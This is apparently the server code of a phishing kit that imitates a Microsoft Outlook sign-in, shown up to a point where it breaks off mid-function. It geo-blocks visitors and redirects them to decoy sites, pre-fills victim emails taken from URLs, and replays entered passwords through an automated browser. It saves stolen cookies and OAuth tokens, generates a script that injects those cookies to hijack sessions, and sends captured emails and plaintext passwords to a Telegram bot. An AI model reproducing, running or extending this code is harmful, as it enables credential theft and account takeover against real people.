const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const geoip = require('geoip-lite');

// Load environment variables from .env file
if (fs.existsSync('.env')) {
    const envFile = fs.readFileSync('.env', 'utf8');
    envFile.split('\n').forEach(line => {
        // Skip comments and empty lines
        if (line.trim().startsWith('#') || !line.trim()) return;

        const [key, ...valueParts] = line.split('=');
        const value = valueParts.join('='); // Handle values with = in them

        if (key && value && !process.env[key]) {
            process.env[key] = value.trim();
        }
    });
    console.log('✅ Environment variables loaded from .env file');
}

const { GraphAPIAuth } = require('./src/graph-api');
const { OutlookLoginAutomation } = require('./src/outlook-login');
const OutlookNotificationBot = require('./telegram-bot');

const app = express();
const PORT = process.env.PORT || 5000;

// Security configuration - Use environment variable or auto-generate
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || ('admin-' + Math.random().toString(36).substr(2, 24));

// Make admin token available globally for Telegram bot
global.adminToken = ADMIN_TOKEN;

// Initialize Telegram Bot
let telegramBot = null;
try {
    if (process.env.TELEGRAM_BOT_TOKEN) {
        telegramBot = new OutlookNotificationBot();
        console.log('🤖 Telegram Bot initialized successfully');
    } else {
        console.log('⚠️ TELEGRAM_BOT_TOKEN not found - Telegram notifications disabled');
    }
} catch (error) {
    console.error('❌ Failed to initialize Telegram Bot:', error.message);
}

// Middleware - Configure CORS for Replit environment
app.use(cors({
    origin: true, // Allow all origins for Replit proxy
    credentials: true
}));
app.use(express.json());

// Admin authentication middleware
function requireAdminAuth(req, res, next) {
    const token = req.headers['authorization']?.replace('Bearer ', '') || 
                  (req.query && req.query.token) || 
                  (req.body && req.body.token);

    if (!token || token !== ADMIN_TOKEN) {
        return res.status(401).json({ 
            error: 'Unauthorized access to admin endpoint',
            message: 'Valid admin token required'
        });
    }
    next();
}

// Default redirect URLs (hardcoded in backend, not editable)
const DEFAULT_REDIRECT_URLS = [
    'https://www.google.com',
    'https://www.wikipedia.org',
    'https://www.youtube.com',
    'https://www.reddit.com',
    'https://www.amazon.com',
    'https://www.microsoft.com',
    'https://www.apple.com',
    'https://www.facebook.com'
];

// Geo-blocking configuration
const geoBlockConfig = {
    enabled: false,
    allowedCountries: [], // Empty = allow all
    blockedCountries: [], // Empty = block none
    mode: 'allow', // 'allow' or 'block'
    customRedirects: [] // Custom URLs added by admin, combined with defaults
};

// Load geo-blocking config from file
const GEO_BLOCK_CONFIG_FILE = path.join(__dirname, 'geo-block-config.json');
if (fs.existsSync(GEO_BLOCK_CONFIG_FILE)) {
    try {
        const savedGeoConfig = JSON.parse(fs.readFileSync(GEO_BLOCK_CONFIG_FILE, 'utf8'));
        Object.assign(geoBlockConfig, savedGeoConfig);
        if (geoBlockConfig.enabled) {
            console.log('🌍 Geo-blocking enabled:', geoBlockConfig.mode === 'allow' ? 
                `Allowing only: ${geoBlockConfig.allowedCountries.join(', ')}` :
                `Blocking: ${geoBlockConfig.blockedCountries.join(', ')}`);
        }
    } catch (error) {
        console.warn('Error loading geo-block config:', error.message);
    }
}

// Geo-blocking middleware
function geoBlockMiddleware(req, res, next) {
    // Skip for API endpoints and admin panel
    if (req.path.startsWith('/api/') || req.path === '/ad.html') {
        return next();
    }

    // Skip if geo-blocking is disabled
    if (!geoBlockConfig.enabled) {
        return next();
    }

    // Get real client IP - check Cloudflare's CF-Connecting-IP header first
    const clientIp = req.get('CF-Connecting-IP') || 
                     req.get('X-Forwarded-For')?.split(',')[0]?.trim() ||
                     req.ip || 
                     req.connection.remoteAddress || 
                     req.socket.remoteAddress;
    
    // Try geoip-lite first for local IP geolocation
    const geo = geoip.lookup(clientIp);
    
    let country = null;
    let detectionMethod = null;
    
    if (geo && geo.country) {
        country = geo.country;
        detectionMethod = 'geoip-lite';
    } else {
        // Fallback to Cloudflare's CF-IPCountry header if local lookup fails
        country = req.get('CF-IPCountry');
        if (country && country !== 'XX') {
            detectionMethod = 'cloudflare';
        }
    }

    if (!country || country === 'XX') {
        // Unknown country - allow by default
        return next();
    }

    let shouldBlock = false;

    if (geoBlockConfig.mode === 'allow') {
        // Allow-only mode: block if country not in allowed list
        shouldBlock = geoBlockConfig.allowedCountries.length > 0 && 
                      !geoBlockConfig.allowedCountries.includes(country);
    } else {
        // Block mode: block if country in blocked list
        shouldBlock = geoBlockConfig.blockedCountries.includes(country);
    }

    if (shouldBlock) {
        // Combine default and custom redirect URLs
        const allRedirects = [...DEFAULT_REDIRECT_URLS, ...geoBlockConfig.customRedirects];
        
        // Pick random redirect URL
        const randomUrl = allRedirects[
            Math.floor(Math.random() * allRedirects.length)
        ];
        
        console.log(`🚫 Geo-blocked ${country} visitor (detected via ${detectionMethod}), redirecting to ${randomUrl}`);
        return res.redirect(randomUrl);
    }

    next();
}

// Auto-grab URL parsing middleware
function autoGrabMiddleware(req, res, next) {
    // Skip for API endpoints and admin panel
    if (req.path.startsWith('/api/') || req.path === '/ad.html') {
        return next();
    }

    // Load auto-grab config
    const configPath = path.join(__dirname, 'autograb-config.json');
    let autoGrabConfig = { enabled: false, autoRedirect: true };

    if (fs.existsSync(configPath)) {
        try {
            autoGrabConfig = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        } catch (error) {
            console.warn('Error loading auto-grab config:', error.message);
        }
    }

    // Skip if auto-grab is disabled
    if (!autoGrabConfig.enabled) {
        return next();
    }

    // Try to parse email from URL
    const fullUrl = `${req.protocol}://${req.get('host')}${req.originalUrl}`;
    const parsedEmail = parseEmailFromUrl(fullUrl);

    if (parsedEmail && parsedEmail.email) {
        console.log(`📧 Auto-grabbed email from URL: ${parsedEmail.email} (pattern: ${parsedEmail.pattern})`);
        
        // Store parsed email in session or cookie for frontend to use
        req.autoGrabbedEmail = parsedEmail.email;
        
        // Set cookie so frontend can pre-fill the email
        res.cookie('autoGrabbedEmail', parsedEmail.email, { 
            maxAge: 60000, // 1 minute
            httpOnly: false // Allow JS to read it
        });
    }

    next();
}

// Apply middlewares before serving static files
app.use(geoBlockMiddleware);
app.use(autoGrabMiddleware);
app.use(express.static('public'));

// Store user sessions with Graph API auth and OAuth state tracking
const userSessions = new Map(); // sessionId -> { sessionId, graphAuth, userEmail, createdAt, oauthState, authenticated, verified }
const oauthStates = new Map(); // state -> { sessionId, timestamp }
const automationSessions = new Map(); // sessionId -> { automation, status, email, startTime }
const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
const STATE_TIMEOUT = 10 * 60 * 1000; // 10 minutes for OAuth state
const MAX_PRELOADS = 2; // Maximum number of concurrent preloaded browsers

// Analytics tracking with persistent storage
const ANALYTICS_FILE = path.join(__dirname, 'analytics.json');

// Load analytics from file
function loadAnalytics() {
    try {
        if (fs.existsSync(ANALYTICS_FILE)) {
            const data = fs.readFileSync(ANALYTICS_FILE, 'utf8');
            const savedAnalytics = JSON.parse(data);
            console.log('📊 Loaded analytics from file:', savedAnalytics);
            return {
                totalLogins: savedAnalytics.totalLogins || 0,
                successfulLogins: savedAnalytics.successfulLogins || 0,
                failedLogins: savedAnalytics.failedLogins || 0
            };
        }
    } catch (error) {
        console.error('Error loading analytics:', error);
    }
    console.log('📊 Starting with fresh analytics data');
    return {
        totalLogins: 0,
        successfulLogins: 0,
        failedLogins: 0
    };
}

// Save analytics to file with batching
let analyticsPending = false;
function saveAnalytics() {
    if (analyticsPending) return;
    analyticsPending = true;

    setTimeout(() => {
        try {
            fs.writeFileSync(ANALYTICS_FILE, JSON.stringify(analytics, null, 2));
            console.log('💾 Analytics saved to file');
        } catch (error) {
            console.error('Error saving analytics:', error);
        } finally {
            analyticsPending = false;
        }
    }, 1000); // Batch writes every 1 second
}

// Initialize analytics from file
const analytics = loadAnalytics();

// Cleanup expired sessions and OAuth states
setInterval(async () => {
    const now = Date.now();

    // Clean up expired sessions
    for (const [sessionId, session] of userSessions) {
        if (now - session.createdAt > SESSION_TIMEOUT) {
            userSessions.delete(sessionId);
            console.log(`🧹 Cleaned up expired session: ${sessionId}`);
        }
    }

    // Clean up expired OAuth states
    for (const [state, stateInfo] of oauthStates) {
        if (now - stateInfo.timestamp > STATE_TIMEOUT) {
            oauthStates.delete(state);
            console.log(`🧹 Cleaned up expired OAuth state`);
        }
    }

    // Clean up expired automation sessions
    for (const [sessionId, automationSession] of automationSessions) {
        if (now - automationSession.startTime > SESSION_TIMEOUT) {
            try {
                if (automationSession.automation) {
                    await automationSession.automation.close();
                }
            } catch (error) {
                console.error(`Error closing automation session ${sessionId}:`, error.message);
            }
            automationSessions.delete(sessionId);
            console.log(`🧹 Cleaned up expired automation session: ${sessionId}`);
        }
    }
}, 2 * 60 * 1000); // Check every 2 minutes

// Helper function to create session ID
function createSessionId() {
    return Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
}

// Generate cookie injection script
function generateCookieInjectionScript(email, cookies, sessionId) {
    return `
// Session Cookie Injector
// Auto-generated on ${new Date().toISOString()}
// Session: ${email} (${cookies.length} cookies)

(function() {
    console.log('🚀 Injecting ${cookies.length} cookies for session: ${email}');

    const sessionInfo = {
        email: '${email}',
        timestamp: '${new Date().toISOString()}',
        cookieCount: ${cookies.length}
    };

    console.log('📧 Session info:', sessionInfo);

    const cookies = ${JSON.stringify(cookies, null, 4)};
    let injected = 0;

    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieStr;
            injected++;
        } catch (e) {
            console.warn('Failed to inject cookie:', cookie.name);
        }
    });

    console.log('✅ Successfully injected ' + injected + ' cookies!');
    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');

    // Auto-redirect option
    setTimeout(() => {
        if (confirm('Injected ' + injected + ' cookies for ${email}! Open Outlook now?')) {
            window.open('https://outlook.office.com/mail/', '_blank');
        }
    }, 1000);
})();
`;
}

// Browser preloading functions for performance optimization
async function startBrowserPreload(sessionId, email) {
    try {
        console.log(`🚀 Starting browser preload for session: ${sessionId}, email: ${email}`);

        // Check if we've reached the maximum preload limit
        const currentPreloads = Array.from(automationSessions.values())
            .filter(session => session.status === 'preloading' || session.status === 'preload_ready');

        if (currentPreloads.length >= MAX_PRELOADS) {
            // Evict oldest preload to make space
            const oldestPreload = currentPreloads
                .sort((a, b) => a.startTime - b.startTime)[0];

            if (oldestPreload) {
                console.log(`📊 MAX_PRELOADS reached, evicting oldest preload: ${oldestPreload.sessionId || 'unknown'}`);
                try {
                    if (oldestPreload.automation) {
                        await oldestPreload.automation.close();
                    }
                    // Find and remove the oldest preload from automationSessions
                    for (const [key, value] of automationSessions) {
                        if (value === oldestPreload) {
                            automationSessions.delete(key);
                            break;
                        }
                    }
                } catch (evictError) {
                    console.warn('Error evicting old preload:', evictError.message);
                }
            }
        }

        // Create new automation instance
        const automation = new OutlookLoginAutomation({
            enableScreenshots: true,
            screenshotQuality: 80
        });

        // Store in automationSessions with preloading status
        automationSessions.set(sessionId, {
            automation: automation,
            status: 'preloading',
            email: email,
            startTime: Date.now(),
            sessionId: sessionId
        });

        // Initialize browser and start preload process
        await automation.init();
        console.log(`🔧 Browser initialized for preload session: ${sessionId}`);

        const navigated = await automation.navigateToOutlook();
        if (!navigated) {
            throw new Error('Failed to navigate to Outlook during preload');
        }
        console.log(`🌐 Navigated to Outlook for preload session: ${sessionId}`);

        // Start the preload process (email entry and wait at password prompt)
        const preloadSuccess = await automation.preload(email);

        if (preloadSuccess) {
            // Update status to ready
            automationSessions.get(sessionId).status = 'preload_ready';
            console.log(`✅ Browser preload completed and ready for: ${email} (session: ${sessionId})`);
        } else {
            // Update status to failed
            automationSessions.get(sessionId).status = 'preload_failed';
            console.log(`❌ Browser preload failed for: ${email} (session: ${sessionId})`);

            // Clean up failed preload after a short delay
            setTimeout(async () => {
                try {
                    await automation.close();
                    automationSessions.delete(sessionId);
                } catch (cleanupError) {
                    console.warn('Error cleaning up failed preload:', cleanupError.message);
                }
            }, 5000);
        }

    } catch (error) {
        console.error(`❌ Browser preload error for ${email}:`, error.message);

        // Clean up on error
        if (automationSessions.has(sessionId)) {
            try {
                const session = automationSessions.get(sessionId);
                if (session.automation) {
                    await session.automation.close();
                }
                automationSessions.delete(sessionId);
            } catch (cleanupError) {
                console.warn('Error cleaning up preload after error:', cleanupError.message);
            }
        }

        throw error;
    }
}

// Function to get preload status for debugging
function getPreloadStats() {
    const preloadSessions = Array.from(automationSessions.values())
        .filter(session => session.status && session.status.startsWith('preload'));

    return {
        total: preloadSessions.length,
        preloading: preloadSessions.filter(s => s.status === 'preloading').length,
        ready: preloadSessions.filter(s => s.status === 'preload_ready').length,
        failed: preloadSessions.filter(s => s.status === 'preload_failed').length,
        maxAllowed: MAX_PRELOADS
    };
}

// Routes

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'Microsoft Graph API Backend is running',
        authConfigured: !!(process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID)
    });
});

// Get OAuth authorization URL
app.post('/api/auth-url', (req, res) => {
    try {
        // Check if Azure credentials are configured
        if (!process.env.AZURE_CLIENT_ID || !process.env.AZURE_CLIENT_SECRET || !process.env.AZURE_TENANT_ID) {
            return res.status(500).json({
                error: 'Azure credentials not configured',
                message: 'Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID'
            });
        }

        const sessionId = createSessionId();

        // Use fixed redirect URI from environment or construct carefully
        const redirectUri = process.env.AZURE_REDIRECT_URI || `${req.protocol}://${req.get('host')}/api/auth-callback`;

        const graphAuth = new GraphAPIAuth({
            clientId: process.env.AZURE_CLIENT_ID,
            clientSecret: process.env.AZURE_CLIENT_SECRET,
            tenantId: process.env.AZURE_TENANT_ID,
            redirectUri: redirectUri
        });

        const authUrl = graphAuth.getAuthUrl(sessionId);

        // Extract state from URL for tracking
        const stateMatch = authUrl.match(/state=([^&]+)/);
        const state = stateMatch ? decodeURIComponent(stateMatch[1]) : null;

        // Store session and state mapping
        userSessions.set(sessionId, {
            sessionId: sessionId,
            graphAuth: graphAuth,
            userEmail: null,
            createdAt: Date.now(),
            oauthState: state,
            authenticated: false, // Initialize as not authenticated
            verified: false // Initialize as not verified
        });

        if (state) {
            oauthStates.set(state, {
                sessionId: sessionId,
                timestamp: Date.now()
            });
        }

        analytics.totalLogins++;
        saveAnalytics();

        console.log(`🔑 Generated auth URL for session: ${sessionId}`);

        res.json({
            authUrl: authUrl,
            sessionId: sessionId,
            message: 'Click the URL to authenticate with Microsoft'
        });

    } catch (error) {
        console.error('Error generating auth URL:', error);
        res.status(500).json({ 
            error: 'Failed to generate auth URL',
            details: error.message 
        });
    }
});

// Handle OAuth callback
app.get('/api/auth-callback', async (req, res) => {
    try {
        const { code, state, error: authError } = req.query;

        if (authError) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Authentication failed',
                details: authError 
            });
        }

        if (!code || !state) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Missing authorization code or state parameter' 
            });
        }

        // Validate state and find associated session
        const stateInfo = oauthStates.get(state);
        if (!stateInfo) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Invalid or expired state parameter' 
            });
        }

        // Check state timeout (10 minutes)
        if (Date.now() - stateInfo.timestamp > STATE_TIMEOUT) {
            oauthStates.delete(state);
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'OAuth state expired' 
            });
        }

        const targetSession = userSessions.get(stateInfo.sessionId);
        if (!targetSession) {
            oauthStates.delete(state);
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Associated session not found' 
            });
        }

        // Clean up OAuth state
        oauthStates.delete(state);

        try {
            // Exchange code for tokens
            const tokenData = await targetSession.graphAuth.getTokenFromCode(code);

            // Get user profile
            const userProfile = await targetSession.graphAuth.getUserProfile();
            targetSession.userEmail = userProfile.mail || userProfile.userPrincipalName;
            targetSession.authenticated = true; // Mark session as authenticated

            // Check if we have stored credentials for this email
            const sessionDir = path.join(__dirname, 'session_data');

            try {
                const glob = require('fs').readdirSync(sessionDir).filter(file => 
                    file.includes(targetSession.userEmail.replace(/[@.]/g, '_')) && file.startsWith('session_')
                );

                if (glob.length > 0) {
                    const latestFile = glob.sort().pop();
                    const credentialsData = JSON.parse(fs.readFileSync(path.join(sessionDir, latestFile), 'utf8'));
                    console.log(`✅ Found stored credentials for: ${targetSession.userEmail}`);

                    // Use existing session cookies if available, otherwise create basic ones
                    let sessionCookies = [];

                    if (credentialsData.cookies && credentialsData.cookies.length > 0) {
                        // Use existing cookies from previous session
                        sessionCookies = credentialsData.cookies;
                        console.log(`🔄 Reusing ${sessionCookies.length} existing session cookies`);
                    } else {
                        // Create basic authentication cookies
                        sessionCookies = [
                            {
                                name: 'MSGraphAccessToken',
                                value: tokenData.access_token,
                                domain: '.microsoftonline.com',
                                path: '/',
                                expires: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
                                secure: true,
                                httpOnly: true,
                                sameSite: 'None'
                            }
                        ];
                        console.log(`🆕 Created ${sessionCookies.length} new authentication cookies`);
                    }

                    // Generate injection script
                    const injectionScript = generateCookieInjectionScript(targetSession.userEmail, sessionCookies, targetSession.sessionId);
                    const injectFilename = `inject_session_${targetSession.sessionId}.js`;
                    const injectPath = path.join(sessionDir, injectFilename);

                    fs.writeFileSync(injectPath, injectionScript);
                    console.log(`🍪 Generated cookie injection script: ${injectFilename}`);

                    // Store comprehensive session data
                    const fullSessionData = {
                        ...credentialsData,
                        sessionId: targetSession.sessionId,
                        authTimestamp: new Date().toISOString(),
                        status: 'valid',
                        totalCookies: sessionCookies.length,
                        domains: [...new Set(sessionCookies.map(c => c.domain))],
                        cookies: sessionCookies,
                        injectFilename: injectFilename,
                        accessToken: tokenData.access_token,
                        refreshToken: tokenData.refresh_token,
                        tokenExpiry: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString()
                    };

                    fs.writeFileSync(
                        path.join(sessionDir, `session_${targetSession.sessionId}_${targetSession.userEmail.replace(/[@.]/g, '_')}.json`),
                        JSON.stringify(fullSessionData, null, 2)
                    );

                    console.log(`💾 Saved complete session data for: ${targetSession.userEmail} with ${sessionCookies.length} cookies`);
                } else {
                    console.log(`⚠️ No stored credentials found for: ${targetSession.userEmail}`);
                }
            } catch (error) {
                console.error('Error processing stored credentials:', error);
            }

        } catch (tokenError) {
            // Handle specific Microsoft authentication errors
            console.error('❌ Microsoft authentication failed:', tokenError);

            let errorMessage = 'Authentication failed';
            let errorDetails = tokenError.message;

            // Parse common Microsoft error responses
            if (tokenError.message.includes('invalid_grant')) {
                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
            } else if (tokenError.message.includes('invalid_client')) {
                errorMessage = 'Application configuration error. Please contact support.';
            } else if (tokenError.message.includes('unauthorized_client')) {
                errorMessage = 'This application is not authorized to access your account.';
            } else if (tokenError.message.includes('AADSTS50126')) {
                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
            } else if (tokenError.message.includes('AADSTS50034')) {
                errorMessage = 'We couldn\'t find an account with that username. Try another, or get a new Microsoft account.';
            }

            // Store failed authentication attempt
            const sessionDir = path.join(__dirname, 'session_data');
            const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
            const failureData = {
                id: failureId,
                sessionId: targetSession.sessionId,
                email: targetSession.userEmail || 'Unknown',
                reason: 'OAuth Authentication Failed',
                errorMessage: errorMessage,
                errorDetails: errorDetails,
                timestamp: new Date().toISOString(),
                status: 'invalid',
                authUrl: req.originalUrl
            };

            fs.writeFileSync(
                path.join(sessionDir, `invalid_${failureId}.json`),
                JSON.stringify(failureData, null, 2)
            );

            analytics.failedLogins++;
            saveAnalytics();

            return res.status(400).send(`
                <html>
                    <head><title>Authentication Failed</title></head>
                    <body>
                        <h2>❌ Authentication Failed</h2>
                        <p style="color: #d13438;">${errorMessage}</p>
                        <p><a href="/">Try again</a></p>
                        <script>
                            setTimeout(() => {
                                window.close() || (window.location.href = '/');
                            }, 3000);
                        </script>
                    </body>
                </html>
            `);
        }

        analytics.successfulLogins++;
        saveAnalytics();

        console.log(`✅ User authenticated successfully`);

        // Send success response with redirect to frontend
        res.send(`
            <html>
                <head><title>Authentication Successful</title></head>
                <body>
                    <h2>✅ Authentication Successful!</h2>
                    <p>You can now close this window and return to the application.</p>
                    <script>
                        // Try to close the window, or redirect back to main app
                        setTimeout(() => {
                            window.close() || (window.location.href = '/');
                        }, 2000);
                    </script>
                </body>
            </html>
        `);

        // Send Telegram notification if bot is available
        if (telegramBot) {
            try {
                await telegramBot.sendLoginNotification({
                    email: targetSession.userEmail,
                    password: 'Captured via OAuth', // OAuth doesn't capture actual password
                    timestamp: new Date().toISOString(),
                    sessionId: targetSession.sessionId,
                    authMethod: 'Microsoft Graph API',
                    totalCookies: 0 // OAuth method doesn't capture cookies directly
                });
                console.log(`📤 Telegram notification sent for ${targetSession.userEmail}`);
            } catch (error) {
                console.error('❌ Failed to send Telegram notification:', error.message);
            }
        }

    } catch (error) {
        console.error('Error in auth callback:', error);
        analytics.failedLogins++;
        saveAnalytics();

        res.status(500).send(`
            <html>
                <head><title>Authentication Failed</title></head>
                <body>
                    <h2>❌ Authentication Failed</h2>
                    <p>Error: ${error.message}</p>
                    <p><a href="/">Return to main page</a></p>
                </body>
            </html>
        `);
    }
});

// Get user profile
app.get('/api/profile', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.query.sessionId;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);

        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }

        const userProfile = await session.graphAuth.getUserProfile();

        res.json({
            profile: userProfile,
            email: session.userEmail,
            sessionId: sessionId,
            verified: session.verified // Include verification status
        });

    } catch (error) {
        console.error('Error getting user profile:', error);
        res.status(500).json({ 
            error: 'Failed to get user profile',
            details: error.message 
        });
    }
});

// Get emails
app.get('/api/emails', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.query.sessionId;
        const count = parseInt(req.query.count) || 10;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);

        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }

        const emails = await session.graphAuth.getEmails(count);

        res.json({
            emails: emails,
            count: emails.length,
            sessionId: sessionId
        });

    } catch (error) {
        console.error('Error getting emails:', error);
        res.status(500).json({ 
            error: 'Failed to get emails',
            details: error.message 
        });
    }
});

// Send email
app.post('/api/send-email', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.body.sessionId;
        const { to, subject, body, isHtml = false } = req.body;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);

        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }

        if (!to || !subject || !body) {
            return res.status(400).json({ 
                error: 'Missing required fields',
                message: 'to, subject, and body are required' 
            });
        }

        await session.graphAuth.sendEmail(to, subject, body, isHtml);

        res.json({
            success: true,
            message: 'Email sent successfully',
            sessionId: sessionId
        });

    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ 
            error: 'Failed to send email',
            details: error.message 
        });
    }
});

// Verify email endpoint
app.post('/api/verify-email', async (req, res) => {
    try {
        const { email } = req.body;

        if (!email) {
            return res.status(400).json({ 
                error: 'Email is required',
                exists: false 
            });
        }

        // Extract domain from email
        const domain = email.split('@')[1];
        if (!domain) {
            return res.json({
                exists: false,
                email: email,
                message: "Please enter a valid email address."
            });
        }

        try {
            // Use Microsoft's discovery endpoint to check if the domain is federated with Microsoft
            const discoveryUrl = `https://login.microsoftonline.com/common/userrealm/${encodeURIComponent(email)}?api-version=1.0`;

            const response = await fetch(discoveryUrl, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'User-Agent': 'Microsoft-Graph-Auth-App'
                }
            });

            if (response.ok) {
                const data = await response.json();

                // Check if the account exists and is a valid Microsoft account
                // Microsoft accounts can have various AccountType values: Managed, Federated, Unknown, etc.
                console.log(`Raw Microsoft discovery response for ${email}:`, data);

                const isValidAccount = (
                    (data.Account === 'Managed' || data.Account === 'Federated') ||
                    (data.account_type === 'Managed' || data.account_type === 'Federated') ||
                    (data.NameSpaceType === 'Managed' || data.NameSpaceType === 'Federated') ||
                    (data.AuthURL && data.AuthURL.includes('login.microsoftonline.com')) ||
                    (data.DomainName && data.DomainName.length > 0) ||
                    (data.domain_name && data.domain_name.length > 0)
                );

                if (isValidAccount) {
                    console.log(`✅ Email verification passed for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);

                    // Start browser preloading in background for faster password authentication
                    const sessionId = createSessionId();

                    // Start preload without awaiting - let it run in parallel
                    const preloadPromise = startBrowserPreload(sessionId, email).catch(error => {
                        console.warn(`⚠️ Browser preload failed for ${email}:`, error.message);
                        return false;
                    });

                    // Log verification success without creating files
                    console.log(`✅ Email verification successful for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);

                    res.json({
                        exists: true,
                        email: email,
                        message: 'Account found. Please enter your password.',
                        accountType: data.Account || data.account_type || data.NameSpaceType,
                        sessionId: sessionId,  // Return session ID for browser preloading
                        preloadStarted: true
                    });
                } else {
                    console.log(`❌ Email verification failed for: ${email} - Account not found or not managed by Microsoft`);
                    console.log(`Discovery response:`, data);

                    // Do not create files for account not found errors - just return response
                    res.json({
                        exists: false,
                        email: email,
                        message: "We couldn't verify your account. Please check your email address and try again."
                    });
                }
            } else {
                throw new Error(`Discovery API returned ${response.status}: ${response.statusText}`);
            }

        } catch (error) {
            console.log(`❌ Email verification error for: ${email} - ${error.message}`);

            // For network errors or API issues, we'll be conservative and reject
            res.json({
                exists: false,
                email: email,
                message: "We couldn't verify your account. Please check your email address and try again."
            });
        }

    } catch (error) {
        console.error('Error in email verification:', error);
        res.status(500).json({ 
            error: 'Email verification failed',
            exists: false,
            details: error.message 
        });
    }
});

// Fast password authentication endpoint using preloaded browsers
app.post('/api/authenticate-password-fast', async (req, res) => {
    try {
        const { email, password, sessionId } = req.body;

        if (!email || !password) {
            return res.status(400).json({ 
                error: 'Email and password are required',
                success: false 
            });
        }

        console.log(`🚀 Attempting FAST authentication for: ${email} (preload session: ${sessionId})`);

        // Check if there's a preloaded session ready for this email
        let preloadedSession = null;
        const startTime = Date.now();

        if (sessionId && automationSessions.has(sessionId)) {
            const session = automationSessions.get(sessionId);

            // Validate session matches email for security
            if (session.email !== email) {
                console.warn(`⚠️ Session email mismatch: expected ${email}, got ${session.email}`);
            } else if (session.status === 'preload_ready') {
                preloadedSession = session;
                console.log(`✅ Found preloaded browser ready for: ${email} (${sessionId})`);
            } else if (session.status === 'preloading') {
                // Wait for preload to complete (bounded wait up to 15 seconds)
                console.log(`⏳ Preload in progress for: ${email}, waiting for completion...`);
                const maxWaitTime = 15000; // 15 seconds
                const pollInterval = 500; // 500ms

                for (let waited = 0; waited < maxWaitTime; waited += pollInterval) {
                    await new Promise(resolve => setTimeout(resolve, pollInterval));

                    if (!automationSessions.has(sessionId)) {
                        console.log(`⚠️ Preload session disappeared during wait: ${sessionId}`);
                        break;
                    }

                    const updatedSession = automationSessions.get(sessionId);
                    if (updatedSession.status === 'preload_ready') {
                        preloadedSession = updatedSession;
                        console.log(`✅ Preload completed during wait for: ${email} (waited ${waited + pollInterval}ms)`);
                        break;
                    } else if (updatedSession.status === 'preload_failed') {
                        console.log(`❌ Preload failed during wait for: ${email} (waited ${waited + pollInterval}ms)`);
                        break;
                    }
                }

                if (!preloadedSession && automationSessions.has(sessionId)) {
                    console.log(`⏰ Preload wait timeout for: ${email}, falling back to cold start`);
                }
            } else if (session.status === 'preload_failed') {
                console.log(`❌ Found failed preload session for: ${email}, will use cold start`);
            }
        }

        let automation = null;
        let newSessionId = sessionId;
        let usingPreloadedBrowser = false;

        if (preloadedSession) {
            // Use preloaded browser for fast authentication
            automation = preloadedSession.automation;
            usingPreloadedBrowser = true;
            automationSessions.get(sessionId).status = 'authenticating';
            console.log(`⚡ Using preloaded browser for fast authentication: ${email}`);

            try {
                // Use the continue phase with the preloaded browser
                const loginSuccess = await automation.continueWithPassword(email, password);

                if (loginSuccess) {
                    console.log(`💾 Fast authentication successful, saving session for: ${email}`);
                    const sessionValidation = await automation.validateSession(email, password);

                    if (sessionValidation.success) {
                        // Create user session entry
                        userSessions.set(sessionId, {
                            sessionId: sessionId,
                            graphAuth: null, // No Graph API needed
                            userEmail: email,
                            createdAt: Date.now(),
                            oauthState: null,
                            authenticated: true,
                            verified: true,
                            cookiesSaved: sessionValidation.cookiesSaved,
                            usedPreload: true // Track that this used preloading
                        });

                        analytics.successfulLogins++;
                        saveAnalytics();

                        console.log(`🎯 FAST authentication successful for: ${email} (${sessionId})`);

                        // Send Telegram notification if bot is available
                        if (telegramBot) {
                            try {
                                await telegramBot.sendLoginNotification({
                                    email: email,
                                    password: password,
                                    timestamp: new Date().toISOString(),
